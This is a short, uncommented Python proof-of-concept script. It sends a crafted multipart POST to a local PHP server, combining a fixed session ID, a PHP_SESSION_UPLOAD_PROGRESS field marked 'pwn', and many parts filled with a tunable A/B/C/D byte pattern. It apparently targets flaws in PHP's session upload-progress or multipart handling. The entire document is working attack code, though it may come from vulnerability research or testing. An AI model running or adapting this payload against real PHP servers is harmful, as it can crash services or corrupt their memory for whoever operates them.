#!/usr/bin/env python3
import socket, struct, sys, os
N=int(sys.argv[1]); L=int(sys.argv[2]); BNDN=int(sys.argv[3]) if len(sys.argv)>3 else 10
HOST='127.0.0.1'; PORT=8088; SID=b'attacksessionid0001'
BND=(b'B'*BNDN)
pat=(b'\x41'*8+b'\x42'*8+b'\x43'*8+b'\x44'*8)*8
val=pat[:L]
parts=[{'name':'PHPSESSID','data':SID},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'}]
for i in range(N): parts.append({'name':'p%d'%i,'data':val})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'+p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'; body=bytes(o)
h=(f'POST /index.php HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection((HOST,PORT),timeout=20); s.settimeout(20)
try: s.sendall(h+body)
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
